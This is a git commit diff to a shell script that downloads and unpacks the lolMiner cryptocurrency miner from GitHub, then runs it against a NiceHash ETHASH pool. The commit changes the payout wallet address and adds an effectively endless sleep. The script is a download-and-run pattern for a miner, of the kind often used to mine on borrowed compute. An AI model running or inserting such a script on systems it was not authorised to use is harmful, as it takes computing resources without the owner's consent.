fb795173a8396c4eec83e74c7b01325a358bf9e7
angkii <83603708+angkii@users.noreply.github.com>
2022-01-07 14:19:26 +0700

    Update kamu.sh

--- kamu.sh
+++ kamu.sh
@@ -2,6 +2,6 @@ wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolM
 
 tar -xvf lolMiner_v1.29_Lin64.tar.gz
 
-cd 1.29 ; ./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3QNwN7po9nDzeSS5aoYR2bwk6nm5WqX6wo.worker1 --ethstratum ETHPROXY
+cd 1.29 ; ./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 36BcJzB3RkXETAgL17Cjt9i4yfFhkVz3Nf.worker1 --ethstratum ETHPROXY
 
-tidur 999999999999999999999999999999
+sleep 999999999999999999999999999999
